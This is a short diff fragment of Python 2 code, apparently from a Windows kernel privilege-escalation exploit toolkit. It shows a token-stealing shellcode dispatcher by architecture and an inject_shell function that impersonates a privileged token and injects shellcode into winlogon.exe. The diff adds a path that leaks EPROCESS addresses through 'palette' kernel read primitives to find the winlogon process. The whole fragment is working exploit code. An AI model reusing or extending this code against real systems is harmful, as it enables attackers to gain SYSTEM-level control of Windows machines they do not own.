+	return shellcode
+
 def tokenstealing(RETVAL, extra = ""):
 	print "[*] Creating token stealing shellcode"
 	if platform.architecture()[0] == '64bit': return tokenstealingx64(RETVAL, extra)
@@ -1503,12 +1789,15 @@ def getosvariablesx():
 	if platform.architecture()[0] == '64bit': return getosvariablesx64()
 	else: return getosvariablesx86()
 	
-def inject_shell():
+def inject_shell(manager_palette=None, worker_palette=None):
 	"""Impersonate privileged token and inject shellcode into winlogon.exe"""
 
 	# Get winlogon.exe pid
-	pid = getpid("winlogon.exe")
-
+	if manager_palette != None and worker_palette != None:
+		pointer_EPROCESS = leak_eprocess_address_palette(manager_palette, worker_palette)
+		(pid, pid_EPROCESS) = find_pid_and_eprocess_by_name_palette(manager_palette, worker_palette, pointer_EPROCESS, "winlogon.exe")
+	else:
+		pid = getpid("winlogon.exe")
 	# Get a handle to the winlogon process we are injecting into 
 	hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
 
